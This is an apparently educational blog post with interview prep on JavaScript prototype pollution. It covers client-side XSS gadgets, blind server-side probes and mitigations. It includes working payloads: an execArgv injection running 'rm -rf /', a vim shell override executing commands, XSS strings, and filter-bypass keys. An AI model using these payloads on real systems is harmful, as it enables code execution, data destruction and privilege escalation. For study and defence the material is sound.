---
layout: default
title: "Prototype Pollution: The Theory & Mechanics (Part 1)"
date: 2025-12-26
categories: [Web Security, Theory, Prototype Pollution]
toc: true
---

# Prototype Pollution: Hacking the JavaScript Blueprint

Prototype Pollution is a JavaScript-specific vulnerability that allows an attacker to modify the global `Object.prototype`. Because almost all objects in JavaScript inherit from this prototype, modifying it effectively injects properties into **every object** running in the application.

This can lead to DOM XSS on the client side and Remote Code Execution (RCE) or Denial of Service (DoS) on the server side (Node.js).

---

## 🔸 1. The Core Mechanism

To understand this vulnerability, you must understand JavaScript inheritance.

### The Prototype Chain
In JavaScript, if you try to access a property that doesn't exist on an object, the engine looks for it on the object's **Prototype**.
**Normal Object:** `let user = {}`
**The Parent:** `user.__proto__` points to `Object.prototype`.
**The Pollution:** If an attacker can modify `Object.prototype`, they change the "blueprint" for all objects.


### How It Happens: Recursive Merge
The vulnerability typically arises during a **recursive merge** operation (combining two objects into one). If the application iterates over user input and assigns values without sanitizing keys like `__proto__`, the attack occurs:

**Normal Assignment:** `target.key = value` (Sets property on the specific object).

**Pollution Assignment:** `target.__proto__.key = value` (Modifies the global `Object.prototype`).

---

## 💻 2. Client-Side Pollution (DOM XSS)

On the client side, the impact is usually manipulating the DOM or JavaScript logic to trigger XSS.

### 🔌 Sources
Where does the malicious data come from?
1.  **URL Query/Fragment:** `vulnerable.com/?__proto__[foo]=bar`
2.  **JSON Input:** `JSON.parse` treats `__proto__` as a normal string, making it a valid key for injection.

### ⚙️ Gadgets & Sinks
A **Gadget** is a piece of application code that uses a property which is normally undefined. By defining it via pollution, we change the code path.

#### Vector 1: Configuration Objects
Libraries often use config objects with defaults.
```
// Vulnerable Logic
let url = config.transport_url || defaults.transport_url;
let script = document.createElement('script');
script.src = `${url}/example.js`; // Sink
```

**Attack:** Inject `__proto__[transport_url]=data:,alert(1);//`.
    
**Result:** The `config` object inherits the malicious URL, creating a script tag that executes the alert.
    

#### Vector 2: The Fetch API

The `fetch` options object allows defining headers.
```
fetch('/api/user', { method: 'GET' }) // 'headers' is undefined
```

**Attack:** Inject `__proto__[headers][x-username]=<img/src/onerror=alert(1)>`.
    
**Result:** The `fetch` call inherits the headers. If the server reflects this header, XSS triggers.
    

#### Vector 3: Object.defineProperty()

Developers use this to secure properties, but the descriptor object itself is vulnerable.

```
Object.defineProperty(obj, 'safeProp', { writable: false }); // 'value' is undefined
```

**Attack:** Inject `__proto__[value]=malicious`.
    
**Result:** The descriptor inherits the `value` property, overwriting the "safe" property with malicious data.
    

---

## ☁️ 3. Server-Side Pollution (Node.js)

On the server (Node.js), pollution is harder to detect (Blind) but can lead to **Remote Code Execution (RCE)**.

### 🚫 Blind Detection Techniques

Since you can't open a console on the server, you rely on side effects.

1. Status Code Override:
    
    Node frameworks often derive the HTTP response status from the error object.
    
    **Payload:** `{"__proto__": {"status": 510}}`
        
    **Check:** Trigger an error (e.g., invalid JSON). If the response code is 510, the server is vulnerable.
        
2. JSON Spaces Override:
    
    Express has a json spaces option for indentation.
    
    **Payload:** `{"__proto__": {"json spaces": 10}}`
        
    **Check:** If the JSON response is heavily indented, pollution succeeded.
        
3. Charset Override:
    
    Polluting content-type can force the server to parse requests using a different charset (like UTF-7) due to a Node bug.
    
    **Payload:** `{"__proto__": {"content-type": "application/json; charset=utf-7"}}`
        
    **Check:** Send a UTF-7 encoded payload. If it's processed correctly, the override worked.
        

---

## 💥 4. RCE Vectors (Server-Side)

Escalating pollution to RCE involves polluting properties used by Node's `child_process` module.

### A. Exploiting `child_process.fork()`

**Gadget:** `execArgv` (arguments passed to the new Node process).
    
**Payload:**
    ```
    {
        "__proto__": {
            "execArgv": [
                "--eval=require('child_process').execSync('rm -rf /')"
            ]
        }
    }
    ```
This executes JavaScript inside the spawned child process.
  

### B. Exploiting `child_process.execSync()`

If the app uses `spawn` or `execSync`, you can override the shell.

**Gadget:** `shell` and `input`.
    
**Strategy:** Set the shell to `vim` because it accepts commands via stdin.
    
**Payload:**
    ```
    {
        "__proto__": {
            "shell": "vim",
            "input": ":! whoami\n"
        }
    }
    ```
    
This forces `vim` to execute the command passed in `input`.


---

## 🛡️ 5. Bypassing Defenses

Sanitizing the string `__proto__` is often insufficient.

### 1. Constructor Injection

If `__proto__` is blocked, access the prototype via the constructor.

**Payload:**

    ```
    {
        "constructor": {
            "prototype": {
                "isAdmin": true
            }
        }
    }
    ```


### 2. Flawed Sanitization

If the sanitizer simply removes `__proto__` once (non-recursive).

**Payload:** `__pro__proto__to__`
  
**Result:** The sanitizer removes the middle `__proto__`, joining the remaining parts to form the dangerous key again.
    

---

## 🛑 6. Prevention & Mitigation

|**Strategy**|**Description**|
|---|---|
|**Freeze Prototype**|`Object.freeze(Object.prototype)` makes the prototype immutable.|
|**Null Prototype**|Use `Object.create(null)` to create objects without a prototype chain.|
|**Maps & Sets**|Use `Map` structures instead of plain objects for storing key-value pairs.|
|**Node Flags**|Use `--disable-proto=delete` to disable `__proto__` at the runtime level.|

---

## ❓ 7. Interview Corner: Common FAQs

### Q1: What is the root cause of Prototype Pollution?

Answer:

It is caused by insecure recursive merge operations that do not validate keys. If an attacker can control both the key (__proto__) and the value in an assignment operation, they can modify Object.prototype.

### Q2: How does Client-Side Prototype Pollution lead to XSS?

Answer:

Attackers pollute properties that the application expects to be undefined (Gadgets). For example, polluting a transport_url property that is later used to define a <script src="..."> attribute allows injecting malicious JavaScript sources.

### Q3: Why is `JSON.parse()` dangerous in this context?

Answer:

JSON.parse() treats the key __proto__ as a standard string property, whereas directly assigning it in code (obj.__proto__) accesses the prototype getter/setter. This allows the malicious key to enter the object structure, waiting to be merged dangerously later.

### Q4: How do you detect Server-Side Prototype Pollution if it's blind?

Answer:

I would use environment probes that change server behavior without crashing it. Examples include polluting json spaces to change response indentation or polluting status to alter HTTP error codes (e.g., forcing a 510 error).

### Q5: Explain the `constructor.prototype` bypass.

Answer:

Many WAFs or filters block the specific string __proto__. However, in JavaScript, myObj.constructor.prototype points to the exact same object as myObj.__proto__. By nesting the payload inside constructor -> prototype, attackers can bypass the filter and still pollute the global prototype.

### Q6: Can Prototype Pollution lead to RCE?

Answer:

Yes, specifically on server-side Node.js environments. By polluting properties consumed by child_process functions (like execArgv or shell), an attacker can inject command-line arguments or change the execution shell to execute arbitrary commands.

### Q7: What is `Object.freeze(Object.prototype)`?

Answer:

It is a mitigation technique. It marks the global prototype as immutable. Any attempt to add or modify properties on it will fail (silently or throwing an error depending on strict mode), effectively neutralizing pollution attacks.

### Q8: What is a "Gadget" in the context of Prototype Pollution?

Answer:

A gadget is a piece of existing application code that accesses a property that is normally undefined. When the prototype is polluted, this property becomes defined, changing the control flow of the application to a dangerous sink (like eval or innerHTML).

### Q9: Why use `vim` in a Node.js RCE payload?

Answer:

When exploiting child_process.execSync, we can override the shell property. However, we often can't pass arguments easily. vim is useful because it accepts commands from standard input (stdin). By polluting shell to vim and input to a command, vim executes the payload immediately.

### Q10: How does creating objects with `Object.create(null)` help?

Answer:

It creates an object with a null prototype. This object does not inherit from Object.prototype, so even if the global prototype is polluted, this specific object remains unaffected and safe to use for merging or storage.

---

## 🎭 8. Scenario-Based Questions

### 🎭 Scenario 1: The "Safe" Config

Context: A developer uses Object.defineProperty to set config.url to read-only. They claim it's safe from modification.

The Question: Is it? How do you attack it?

The "Hired" Answer:

"It might not be safe. Object.defineProperty takes a descriptor object. If the developer didn't explicitly define the value property in that descriptor, I can pollute Object.prototype.value. The function will inherit my malicious value and use it to define the property, effectively overwriting the intended URL."

### 🎭 Scenario 2: The "Undefined" Check

Context: The code checks if (config.isAdmin). The developer says "isAdmin is never set on the config object, so it defaults to false."

The Question: How do you exploit this?

The "Hired" Answer:

"This is a classic gadget. Since isAdmin is undefined on the object itself, it looks up the prototype chain. I will pollute Object.prototype with isAdmin: true. The check will now return true for every user, allowing privilege escalation."

### 🎭 Scenario 3: The Filter Bypass

Context: The app strips __proto__ from all JSON inputs.

The Question: How do you proceed?

The "Hired" Answer:

"I will try two things. First, constructor.prototype to access the prototype via a different path. Second, I will check for flawed sanitization logic, such as __pro__proto__to__, hoping the filter is non-recursive and reconstructs the key after deletion."

### 🎭 Scenario 4: Blind RCE Probe

Context: You suspect a Node.js endpoint is vulnerable, but it returns generic JSON.

The Question: How do you test for RCE potential without seeing output?

The "Hired" Answer:

"I would try to pollute shell to node and NODE_OPTIONS to --inspect=collaborator-url. If the application spawns any child process, it will pick up these environment variables and attempt to connect to my Collaborator server, confirming the injection."

### 🎭 Scenario 5: The "Fetch" Header

Context: An app uses fetch('/api') without any headers defined.

The Question: Can you get XSS?

The "Hired" Answer:

"Yes, if the application reflects headers. I can pollute Object.prototype with a headers object containing {'X-Payload': '<script>...'}. The fetch function inherits this property and sends the malicious header. If the server response reflects request headers (e.g., in an error message), the XSS will execute."

---

## 🛑 Summary of Part 1

1. **Concept:** Modifying `Object.prototype` injects properties into all objects.
    
2. **Mechanics:** Exploiting recursive merge functions using `__proto__` or `constructor.prototype`.
    
3. **Impact:** Client-side DOM XSS (via gadgets) and Server-side RCE (via `child_process`).
    
4. **Defense:** `Object.freeze`, Map/Set, and input validation.
